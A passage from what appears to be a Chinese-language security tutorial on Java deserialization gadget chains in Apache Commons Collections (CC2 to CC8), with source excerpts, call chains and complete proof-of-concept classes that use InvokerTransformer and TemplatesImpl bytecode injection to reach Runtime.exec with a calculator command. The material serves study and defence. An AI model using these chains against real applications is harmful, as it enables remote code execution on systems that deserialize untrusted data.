      protected Transformer transformer;
</code></pre>
<p>POM依赖，需要javassist进行一些字节码的操作：</p>
<pre><code>  &lt;dependency&gt;
      &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
      &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
      &lt;version&gt;4.0&lt;/version&gt;
  &lt;/dependency&gt;

  &lt;dependency&gt;
      &lt;groupId&gt;org.javassist&lt;/groupId&gt;
      &lt;artifactId&gt;javassist&lt;/artifactId&gt;
      &lt;version&gt;3.25.0-GA&lt;/version&gt;
  &lt;/dependency&gt;
</code></pre>
<p>CC2 有两个POC，这两个POC都是利用PriorityQueue的readObject作为Source/Kick-Off，区别在于后半段的触发transfomer的Chian，POC1用的<code>TransformingComparator.compare</code>，而POC2用的<code>InvokerTransformer.transfomer</code> 去调用<code>TemplateImpl.newTransformer</code>方法创建一个新的类 </p>
<p>先看PriorityQueue的readObject如何利用TransformingComparator触发transfomer:</p>
<pre><code class="java">public class PriorityQueue&lt;E&gt; extends AbstractQueue&lt;E&gt;
    implements java.io.Serializable &#123;
    
      private final Comparator&lt;? super E&gt; comparator;

    private static final long serialVersionUID = -7720805057305804111L;
        /**
     * Reconstitutes the &#123;@code PriorityQueue&#125; instance from a stream
     * (that is, deserializes it).
     *
     * @param s the stream
     */
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException &#123;
        // Read in size, and any hidden stuff
        s.defaultReadObject();

        // Read in (and discard) array length
        s.readInt();

        queue = new Object[size];

        // Read in all elements.
        for (int i = 0; i &lt; size; i++)
            queue[i] = s.readObject();

        // Elements are guaranteed to be in &quot;proper order&quot;, but the
        // spec has never explained what that might be.
        heapify();
    &#125;
  
    /**
     * Establishes the heap invariant (described above) in the entire tree,
     * assuming nothing about the order of the elements prior to the call.
     */
    private void heapify() &#123;
        for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)
            siftDown(i, (E) queue[i]);
    &#125;
    
    /**
     * Inserts item x at position k, maintaining heap invariant by
     * demoting x down the tree repeatedly until it is less than or
     * equal to its children or is a leaf.
     *
     * @param k the position to fill
     * @param x the item to insert
     */
    private void siftDown(int k, E x) &#123;
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    &#125;
    
    
        private void siftDownUsingComparator(int k, E x) &#123;
        int half = size &gt;&gt;&gt; 1;
        while (k &lt; half) &#123;
            int child = (k &lt;&lt; 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right &lt; size &amp;&amp;
                comparator.compare((E) c, (E) queue[right]) &gt; 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) &lt;= 0)
                break;
            queue[k] = c;
            k = child;
        &#125;
        queue[k] = x;
    &#125;
</code></pre>
<p>PriorityQueue的<code>readObject -&gt; heapify -&gt; siftDown -&gt; siftDownUsingComparator</code> 会调用<code>Comparator.compare</code>，而<code>TransformingComparator.compare</code>方法可以执行transfomer，这就是POC1</p>
<p>POC1:</p>
<pre><code class="java">public class CC2_1 &#123;
    public static void main(String[] args) throws Exception &#123;
        String cmd = &quot;calc&quot;;

        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;
                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;
                ),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;
                        Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;
                ),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)
        &#125;;


        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);

        // 反射修改comparator
        Field comparator = priorityQueue.getClass().getDeclaredField(&quot;comparator&quot;);
        comparator.setAccessible(true);
        comparator.set(priorityQueue, transformingComparator);

        // 模拟序列化和反序列化
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
        outputStream.writeObject(priorityQueue);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
        inputStream.readObject();
    &#125;
&#125;
</code></pre>
<p>POC2在POC1的基础上，利用TransformingComparator.compare执行InvokerTransformer，而InvokerTransformer传入的方法为tamplateImpl.newTransform，从而创建一个恶意类。</p>
<p>POC2:</p>
<pre><code class="java">
public class CC2_2 &#123;
    public static void main(String[] args) throws Exception&#123;
        // 需要反射的两个类
          // 因为需要类型转换，所以要用 AbstractTranslet
          // AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;

        // 这里需要借助javassist中的相关方法，
        ClassPool classPool = ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
          // 动态创建类
        CtClass payload = classPool.makeClass(&quot;CC2&quot;);
          // 动态设置父类
        payload.setSuperclass(classPool.get(AbstractTranslet));
        // 添加静态代码块
              payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
        // 保存字节码
        byte[] bytes = payload.toBytecode();

        // 反射创建TemplatesImpl类实例
        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();
        // 反射修改其中的_bytecodes属性
        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);
        field.setAccessible(true);
        field.set(templatesImpl,new byte[][]&#123;bytes&#125;);

        // 反射修改其中的_name属性
        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);
        field1.setAccessible(true);
        field1.set(templatesImpl,&quot;test&quot;);

        // 创建InvokerTransformer实例，并写好newTransfomer方法调用
        InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);
        
        // 创建TransformingComparator实例，放在后面的PriorityQueue中
        TransformingComparator comparator=new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);

        // 反射修改PriorityQueue中的comparator变量，反序列化后，会自动调用comparator.compare方法
        Field field2=queue.getClass().getDeclaredField(&quot;comparator&quot;);
        field2.setAccessible(true);
        field2.set(queue,comparator);

        // 修改PriorityQueue中的queue变量，因为反序列化后，queue中的对象会传入comparator.compare方法中，
        // 然后调用到templatesImpl.newTransform
        Field field3=queue.getClass().getDeclaredField(&quot;queue&quot;);
        field3.setAccessible(true);
        field3.set(queue,new Object[]&#123;templatesImpl,templatesImpl&#125;);

        // 模拟序列化和反序列化
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
        inputStream.readObject();
    &#125;
&#125;
</code></pre>
<p>调用链</p>
<pre><code>getTransletInstance:409, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    newTransformer:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
        invoke:606, Method (java.lang.reflect)
            transform:129, InvokerTransformer (org.apache.commons.collections4.functors)
                compare:81, TransformingComparator (org.apache.commons.collections4.comparators)
                    siftDownUsingComparator:699, PriorityQueue (java.util)
                        siftDown:667, PriorityQueue (java.util)
                            heapify:713, PriorityQueue (java.util)
                                readObject:773, PriorityQueue (java.util)
</code></pre>
<h2 id="0x3-3-Commons-Collections3"><a href="#0x3-3-Commons-Collections3" class="headerlink" title="0x3.3 Commons Collections3"></a>0x3.3 Commons Collections3</h2><p>限制：</p>
<ul>
<li>JDK 1.7</li>
<li>Commons Collections 3.1</li>
<li>javassist</li>
</ul>
<p>补充InstantiateTransformer的transofrm主要是直接了构造类</p>
<pre><code class="java">public class InstantiateTransformer&lt;T&gt; implements Transformer&lt;Class&lt;? extends T&gt;, T&gt;, Serializable &#123;
      public T transform(Class&lt;? extends T&gt; input) &#123;
            // ...
      Constructor&lt;? extends T&gt; con = input.getConstructor(this.iParamTypes);
      return con.newInstance(this.iArgs);
      // ...
&#125;
</code></pre>
<p>CC3 利用TrAXFilter的构造方法传入的TemplateImpl可以构造出一个静态恶意类</p>
<pre><code class="java">public class CC3 &#123;
    public static void main(String[] args) throws Exception &#123;

        //使用Javassit新建一个含有static的类
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass(&quot;CC3&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = &quot;CC3&quot; + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.writeFile();
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;

        //补充实例化新建类所需的条件
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);
        setFieldValue(templates, &quot;_name&quot;, &quot;ccc&quot;);
        setFieldValue(templates, &quot;_class&quot;, null);

        //实例化新建类
        Transformer[] transformers = new Transformer[] &#123;
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)
        &#125;;
        ChainedTransformer transformerChain = new ChainedTransformer(transformers);

        //调用get()中的transform方法
        HashMap innermap = new HashMap();
        LazyMap outerMap = (LazyMap)LazyMap.decorate(innermap, transformerChain);

        //设置代理，触发invoke()调用get()方法
        Class cls1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor construct = cls1.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler1 = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler1);

        InvocationHandler handler2 = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);

        try&#123;
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
            outputStream.writeObject(handler2);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
            inputStream.readObject();
        &#125;catch(Exception e)&#123;
            e.printStackTrace();
        &#125;
    &#125;

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    &#125;

    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;
        Field field = null;
        try &#123;
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        &#125;
        catch (NoSuchFieldException ex) &#123;
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        &#125;
        return field;
    &#125;
&#125;
</code></pre>
<p>利用链：</p>
<pre><code>ObjectInputStream.readObject()
        AnnotationInvocationHandler.readObject()
            Map(Proxy).entrySet()
                AnnotationInvocationHandler.invoke()
                    LazyMap.get()
                        ChainedTransformer.transform()
                        ConstantTransformer.transform()
                        InstantiateTransformer.transform()
                        newInstance()
                            TrAXFilter#TrAXFilter()
                            TemplatesImpl.newTransformer()
                                     TemplatesImpl.getTransletInstance()
                                     TemplatesImpl.defineTransletClasses
                                     newInstance()
                                        Runtime.exec()
</code></pre>
<p><strong>CC1和CC3的异同之处：</strong></p>
<ul>
<li>Source/Kict-Off都是一样的，使用动态代理作为入口点</li>
<li>Chian不同，CC1使用LazyMap触发transformer ，CC3 使用LazyMap触发TrAXFilter-》TemplatesImpl构造静态类</li>
</ul>
<h2 id="0x3-4-Commons-Collections4"><a href="#0x3-4-Commons-Collections4" class="headerlink" title="0x3.4 Commons Collections4"></a>0x3.4 Commons Collections4</h2><p>限制：</p>
<ul>
<li>JDK 1.7</li>
<li>commons-collections 4.0</li>
<li>javassist</li>
</ul>
<p>CC4 同CC3，Chain使用TrAXFilter 来执行代码，只不过Source/Kick-Off触发方式换成了 PriorityQueue +  TransformingComparator</p>
<p>POC:</p>
<pre><code class="java">
public class CC4 &#123;
    public static void main(String[] args) throws Exception &#123;

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass(&quot;CC4&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = &quot;CC4&quot; + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.writeFile();
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);
        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);
        setFieldValue(templates, &quot;_class&quot;, null);

        Transformer[] transformers = new Transformer[] &#123;
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
        &#125;;
        ChainedTransformer transformerChain = new ChainedTransformer(transformers);

        TransformingComparator Tcomparator = new TransformingComparator(transformerChain);
        PriorityQueue queue = new PriorityQueue(1);

        Object[] queue_array = new Object[]&#123;templates,1&#125;;
        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);
        queue_field.setAccessible(true);
        queue_field.set(queue,queue_array);

        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);
        size.setAccessible(true);
        size.set(queue,2);


        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
        comparator_field.setAccessible(true);
        comparator_field.set(queue,Tcomparator);

        try&#123;
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
            inputStream.readObject();
        &#125;catch(Exception e)&#123;
            e.printStackTrace();
        &#125;
    &#125;

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    &#125;

    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;
        Field field = null;
        try &#123;
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        &#125;
        catch (NoSuchFieldException ex) &#123;
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        &#125;
        return field;
    &#125;
</code></pre>
<p>利用链：</p>
<pre><code>ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                PriorityQueue.siftDownUsingComparator()
                    TransformingComparator.compare()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InstantiateTransformer.transform()
                            newInstance()
                                TrAXFilter#TrAXFilter()
                                TemplatesImpl.newTransformer()
                                         TemplatesImpl.getTransletInstance()
                                         TemplatesImpl.defineTransletClasses
                                         newInstance()
                                            Runtime.exec()
</code></pre>
<h2 id="0x3-5-Commons-Collections5"><a href="#0x3-5-Commons-Collections5" class="headerlink" title="0x3.5 Commons Collections5"></a>0x3.5 Commons Collections5</h2><p>限制：</p>
<ul>
<li>JDK 1.8</li>
<li>Commons Collections 3.1</li>
</ul>
<p>CC5开始了一个新的触发点，也就是BadAttributeValueExpException，看这个类的readObject方法：</p>
<pre><code class="java">public class BadAttributeValueExpException extends Exception   &#123;


    /* Serial version */
    private static final long serialVersionUID = -3105272988410493376L;

    private Object val;

    public BadAttributeValueExpException (Object val) &#123;
        this.val = val == null ? null : val.toString();
    &#125;

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get(&quot;val&quot;, null);

        if (valObj == null) &#123;
            val = null;
        &#125; else if (valObj instanceof String) &#123;
            val= valObj;
        
        // 测试时发现 System.getSecurityManager() == null ，不知道为什么，所以可以跳过这个类型检查
        &#125; else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) &#123;
          
            // 利用点在这，能配合TiedMapEntry触发transforme
            val = valObj.toString();
        &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
        &#125;
    &#125;
 &#125;
</code></pre>
<p>POC:</p>
<pre><code class="java">
public class CC5 &#123;
    public static void main(String[] args) throws Exception&#123;
        String cmd = &quot;calc&quot;;
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;
                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;
                ),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;
                        Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;
                ),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)
        &#125;;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
        // LazyMap 将chainedTransformer 封装到自己的transofrm方法上来
        LazyMap lazyMapDecorate = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);

        // tideMapEntry 的 toString 方法会执行transofrm
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMapDecorate, &quot;xxxx&quot;);

        // BadAttributeValueExpException 的readObject会执行toString方法，所以可以触发chainedTransformer
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);

        // 利用反射，把这个类的属性设置上，这样序列化后就可以执行
        Field val = expException.getClass().getDeclaredField(&quot;val&quot;);
        val.setAccessible(true);
        val.set(expException, tiedMapEntry);

        // 写文件验证
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
        out.writeObject(expException);
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
        in.readObject();
    &#125;
&#125;
</code></pre>
<p>利用链：</p>
<pre><code>ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
</code></pre>
<h2 id="0x3-6-Commons-Collections6"><a href="#0x3-6-Commons-Collections6" class="headerlink" title="0x3.6 Commons Collections6"></a>0x3.6 Commons Collections6</h2><p>限制：</p>
<ul>
<li>JDK 1.8</li>
<li>Commons Collections 3.1</li>
</ul>
<p>CC6 其实也是利用HashMap的readObject中的map.put最终会执行hashCode，所以可配合TiedMapEntry执行Transform。</p>
<pre><code class="java">   private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException &#123;
        // Consume and ignore stream fields (currently zero).
        s.readFields();
                
             // 省略无关代码...


        // Create backing HashMap
        map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ?
               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :
               new HashMap&lt;E,Object&gt;(capacity, loadFactor));

        // Read in all elements in the proper order.
        for (int i=0; i&lt;size; i++) &#123;
            @SuppressWarnings(&quot;unchecked&quot;)
                E e = (E) s.readObject();
          
              // 利用点在这put时会执行 hashCode方法
            map.put(e, PRESENT);
        &#125;
    &#125;

    public V put(K key, V value) &#123;
        return putVal(hash(key), key, value, false, true);
    &#125;

    static final int hash(Object key) &#123;
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
    &#125;
</code></pre>
<p>POC:</p>
<pre><code class="java">public class CC6 &#123;
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;


        String cmd = &quot;open -a Calculator.app&quot;;
        Transformer[] transformers = new Transformer[] &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class&#125;, new String[] &#123;cmd&#125;),
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);

        TiedMapEntry tiedmap = new TiedMapEntry(outerMap,&quot;foo&quot;);
        HashSet hashset = new HashSet();
        hashset.add(tiedmap);
      
          // 由于创建hashset后，会自动给lazyMap添加一个key-value，所以要remove掉这个键值对
                // 以保证lazyMap.get时，map.containsKey(key) == false，从而进入transform函数
                // 避免hashset.add时本地触发exp add-&gt;map.put-&gt;map.hash-&gt;entry.hashcode-&gt;lazymap.get-&gt;transform
        outerMap.remove(&quot;foo&quot;);

//        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
//        f.setAccessible(true);
//        f.set(chainedTransformer, transformers);

        try&#123;
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
            outputStream.writeObject(hashset);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
            inputStream.readObject();
        &#125;catch(Exception e)&#123;
            e.printStackTrace();
        &#125;

    &#125;
&#125;
</code></pre>
<p>利用链：</p>
<pre><code>java.io.ObjectInputStream.readObject()
         java.util.HashMap.readObject()
                 java.util.HashMap.put()
                 java.util.HashMap.hash()
                        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                        org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                             org.apache.commons.collections.map.LazyMap.get()
                                  org.apache.commons.collections.functors.ChainedTransformer.transform()
                                  org.apache.commons.collections.functors.InvokerTransformer.transform()
                                   java.lang.reflect.Method.invoke()
                                          java.lang.Runtime.exec()
</code></pre>
<h2 id="0x3-7-Commons-Collections7"><a href="#0x3-7-Commons-Collections7" class="headerlink" title="0x3.7 Commons Collections7"></a>0x3.7 Commons Collections7</h2><p>限制：</p>
<ul>
<li>JDK 1.8</li>
<li>Commons Collections 3.1</li>
</ul>
<p>CC7是利用HashTable的readObject来触发transform的</p>
<pre><code class="java">public class Hashtable&lt;K,V&gt;
    extends Dictionary&lt;K,V&gt;
    implements Map&lt;K,V&gt;, Cloneable, java.io.Serializable &#123;
  
    private void readObject(ObjectInputStream s)
         throws IOException, ClassNotFoundException
    &#123;

        //省略无关代码...

        // Read the number of elements and then all the key/value objects
        for (; elements &gt; 0; elements--) &#123;
            @SuppressWarnings(&quot;unchecked&quot;)
                K key = (K)s.readObject();
            @SuppressWarnings(&quot;unchecked&quot;)
                V value = (V)s.readObject();
          
              // 触发点在这
            // sync is eliminated for performance
            reconstitutionPut(table, key, value);
        &#125;
    &#125;
  
       private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)
        throws StreamCorruptedException
    &#123;
        if (value == null) &#123;
            throw new java.io.StreamCorruptedException();
        &#125;
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
          // 可以执行 hashCode方法，也就是可以联合TiedMapEntry
        int hash = key.hashCode();
        int index = (hash &amp; 0x7FFFFFFF) % tab.length;
        for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;
            if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;
                throw new java.io.StreamCorruptedException();
            &#125;
        &#125;
        // Creates the new entry.
        @SuppressWarnings(&quot;unchecked&quot;)
            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];
        tab[index] = new Entry&lt;&gt;(hash, key, value, e);
        count++;
    &#125;
</code></pre>
<p>CC7与CC6非常类似。</p>
<p>POC:</p>
<pre><code class="java">public class CC7 &#123;
    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException &#123;
        String cmd = &quot;calc&quot;;

        Transformer[] transformers = new Transformer[] &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class&#125;, new String[] &#123;cmd&#125;),
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap&lt;String, String&gt; hashMap = new HashMap&lt;&gt;();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);
        lazyMap.put(&quot;test&quot;, 1);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;test&quot;);

        Hashtable hashtable = new Hashtable(1);
        hashtable.put(tiedMapEntry, 1);
        lazyMap.remove(&quot;test&quot;);


        try&#123;
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
            outputStream.writeObject(hashtable);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
            inputStream.readObject();
        &#125;catch(Exception e)&#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
</code></pre>
<p>调用链：</p>
<pre><code>java.util.Hashtable.readObject
java.util.Hashtable.reconstitutionPut
org.apache.commons.collections.map.AbstractMapDecorator.equals
java.util.AbstractMap.equals
org.apache.commons.collections.map.LazyMap.get
org.apache.commons.collections.functors.ChainedTransformer.transform
org.apache.commons.collections.functors.InvokerTransformer.transform
java.lang.reflect.Method.invoke
sun.reflect.DelegatingMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke0
java.lang.Runtime.exec
</code></pre>
<h2 id="0x3-8-Commons-Collections8"><a href="#0x3-8-Commons-Collections8" class="headerlink" title="0x3.8 Commons Collections8"></a>0x3.8 Commons Collections8</h2><p>限制：</p>
<ul>
<li>Commons Collections 4.0</li>
</ul>
<p>CC8利用org.apache.commons.collections.bag.TreeBag中readObject会执行compare方法来构造利用链。</p>
<pre><code class="java">public class TreeBag extends AbstractMapBag implements SortedBag, Serializable &#123;
    private static final long serialVersionUID = -7740146511091606676L;
  
      private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;
        in.defaultReadObject();
        Comparator comp = (Comparator)in.readObject();
        super.doReadObject(new TreeMap(comp), in);
    &#125;
</code></pre>
<p>跟进super.doReadObject方法</p>
<pre><code class="java">public abstract class AbstractMapBag implements Bag &#123;
    private transient Map map;
    private int size;
    private transient int modCount;
    private transient Set uniqueSet;

        protected void doReadObject(Map map, ObjectInputStream in) throws IOException, ClassNotFoundException &#123;
        this.map = map;
        int entrySize = in.readInt();

        for(int i = 0; i &lt; entrySize; ++i) &#123;
            Object obj = in.readObject();
            int count = in.readInt();
              // 重点在这，这个地方的map如果是TreeMap 就会执行transform
            map.put(obj, new MutableInteger(count));
            this.size += count;
        &#125;

    &#125;
</code></pre>
<p>POC1:</p>
<pre><code class="java">public class CC8_1 &#123;
    public static void main(String[] args) throws Exception &#123;
        String cmd = &quot;calc&quot;;

        Transformer[] transformers = new Transformer[] &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class&#125;, new String[] &#123;cmd&#125;),
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        TreeBag treeBag = new TreeBag(transformingComparator);
        treeBag.add(null);

        // 模拟序列化和反序列化
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
        outputStream.writeObject(treeBag);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
        inputStream.readObject();

    &#125;
&#125;
</code></pre>
<p>POC2:</p>
<p>利用TemplateImpl创建恶意类</p>
